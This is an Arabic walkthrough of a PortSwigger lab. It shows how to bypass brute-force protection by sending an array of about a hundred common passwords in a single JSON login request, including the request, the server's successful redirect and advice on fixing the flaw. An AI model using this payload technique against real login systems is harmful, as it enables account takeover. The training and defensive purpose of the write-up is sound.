# [Broken brute-force protection, multiple credentials per request](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)

## **`الهدف`**
القيام بعمل `brute-force` علي كلمة المرور الخاصة بحساب `carlos` باستخدام قائمة كلمات المرور التي يوفرها موقع الـ `PortSwigger` وتسجيل الدخول بنجاح إلى حسابه.
## **`خطوات الحل`**
سنقوم  بتسجيل الدخول إلى حساب `carlos` وأي كلمة مرور عشوائية واعتراض الـ `request`
```http
POST /login HTTP/2
Host: 0ac4008d03852639814eac0c00e30061.web-security-academy.net
Cookie: session=LSDpJNLjtoQV4wWa9ynsOGTRDHoPB8Co

{"username":"carlos","password":"1223"}
```

وسنقوم بوضع جميع كلمات المرور الموجودة في القائمة التي يوفرها موقع الـ `PortSwigger`داخل الـ `request`
```http
POST /login HTTP/2
Host: 0ac4008d03852639814eac0c00e30061.web-security-academy.net
Cookie: session=LSDpJNLjtoQV4wWa9ynsOGTRDHoPB8Co

{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow"
  ]
}
```

ونقوم بتمرير الـ `request` ونلاحظ الـ `response` 
```http
HTTP/2 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=g8ivPJhZhjtDyt8eW78gZbN2mkqidvPx; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

وبالرغم من عدم معرفتنا أي كلمة مرور هي الصحيحة إلا أن الـ `response` يوضح نجاح عملية تسجيل الدخول إلى حساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب على السيرفر ألا يثق أبداً في مدخلات المستخدم، و يجب إعداد النظام ليقبل حقل كلمة المرور `password` كقيمة نصية واحدة فقط `(String)` وإذا اكتشف السيرفر أن المستخدم أرسل مصفوفة `(Array)` أو كائن `(Object)` أو أي نوع بيانات آخر غير النص المفرد، يجب أن يتم رفض الـ `request` فورًا وإرجاع رسالة خطأ مثل `400 Bad Request `دون محاولة معالجة البيانات أو تجربة كلمات المرور.

يجب تطبيق قاعدة صارمة لشكل الـ `JSON` المقبول في طلبات تسجيل الدخول، بحيث تحدد بوضوح أن الـ `request` يجب أن يحتوي على حقلين فقط (اسم المستخدم وكلمة المرور)، وأن كلا الحقلين يجب أن يكونا نصوصًا `(Strings)`، وألا يُسمح بإرسال أي حقول إضافية أو أنواع بيانات مختلفة.

يجب أن تكون آلية الحظر `Account Lockout` أو تقييد وصول المستخدمين `User Rate Limiting` مرتبطة بعدد محاولات تسجيل الدخول الفاشلة وليس فقط بعدد الـ `HTTP requests`، أي أن النظام يجب أن يحسب كل كلمة مرور يتم تقييمها كمحاولة منفصلة، حتى لو تم إرسالها بطريقة ما داخل `request` واحد.

وبما أنه في بعض الأحيان قد تكون المشكلة من المكتبة أو الإطار `(Framework)` المستخدم في الواجهة الخلفية والذي يقوم بتحويل الـ `JSON` إلى كائنات برمجية، فيجب ضبط إعدادات هذه المكتبات بحيث لا تقوم بالتساهل وتحويل المصفوفات إلى نصوص أو معالجتها بشكل تلقائي دون علم المبرمج.

ويجب إضافة المصادقة الثنائية `Multi-Factor Authentication - MFA` حتى لا يستطيع المهاجم الدخول إلى الحساب حتى بعد معرفة اسم المستخدم وكلمة المرور.
